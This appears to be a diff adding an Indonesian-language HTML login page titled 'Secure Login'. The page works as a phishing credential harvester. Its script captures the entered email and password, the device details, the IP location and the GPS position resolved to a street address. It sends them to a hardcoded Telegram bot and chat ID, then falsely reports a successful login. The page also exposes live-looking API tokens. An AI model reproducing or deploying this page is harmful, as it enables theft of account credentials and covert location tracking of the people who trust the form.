@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Aman</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0e0e0e;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #1a1a1a;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
+      text-align: center;
+      width: 100%;
+      max-width: 350px;
+    }
+    .container h2 {
+      margin-bottom: 20px;
+      font-weight: 500;
+      color: #00ffff;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+    }
+    input {
+      background: #2b2b2b;
+      color: #fff;
+    }
+    button {
+      background-color: #00ffff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    button:hover {
+      background-color: #00dddd;
+    }
+    small {
+      color: #888;
+      display: block;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Login Sistem</h2>
+    <input type="text" id="email" placeholder="Email" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="kirimData()">Masuk</button>
+    <small>Pastikan data Anda benar</small>
+  </div>
+
+<script>
+const botToken = "8433961260:AAEupWD2_xGOAH7lY-q5reZCkga_qdlilf4";
+const chatId = "7105124387";
+
+async function kirimData() {
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+  const userAgent = navigator.userAgent;
+  const language = navigator.language;
+  const deviceName = userAgent.split(";")[1]?.trim() || "Tidak diketahui";
+  const resolution = `${screen.width}x${screen.height}`;
+  const time = new Date().toLocaleString("id-ID");
+
+  let ipInfo = "Gagal ambil lokasi IP.";
+  try {
+    const ipRes = await fetch("https://ipinfo.io/json?token=f88f90a6e7b3a1");
+    const ipData = await ipRes.json();
+    ipInfo = `${ipData.city}, ${ipData.region}, ${ipData.country}`;
+  } catch {}
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      let alamat = `Koordinat: ${lat}, ${lon}`;
+
+      try {
+        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const data = await geo.json();
+        const a = data.address;
+        alamat = `${a.road || ''}, ${a.village || ''}, ${a.suburb || ''}, ${a.city || a.town || ''}, ${a.state || ''}, ${a.country || ''}`;
+      } catch {}
+
+      const msg = `
+🔐 Login Terdeteksi
+📧 Email: ${email}
+🔑 Password: ${password}
+
+📍 Lokasi GPS: ${alamat}
+🌎 Lokasi IP: ${ipInfo}
+📱 Nama Perangkat: ${deviceName}
+🖥 Resolusi: ${resolution}
+🗣 Bahasa: ${language}
+🔍 User Agent: ${userAgent}
+🕒 Waktu: ${time}
+      `;
+      kirimTelegram(msg);
+    }, () => {
+      const msg = `
+🔐 Login Terdeteksi
+📧 Email: ${email}
+🔑 Password: ${password}
+
+📍 Lokasi GPS: Ditolak
+🌎 Lokasi IP: ${ipInfo}
+📱 Nama Perangkat: ${deviceName}
+🖥 Resolusi: ${resolution}
+🗣 Bahasa: ${language}
+🔍 User Agent: ${userAgent}
+🕒 Waktu: ${time}
+      `;
+      kirimTelegram(msg);
+    });
+  } else {
+    alert("Perangkat tidak mendukung GPS.");
+  }
+}
+
+async function kirimTelegram(text) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  await fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ chat_id: chatId, text: text })
+  });
+  alert("Login berhasil!");
+}
+</script>
+</body>
+</html>
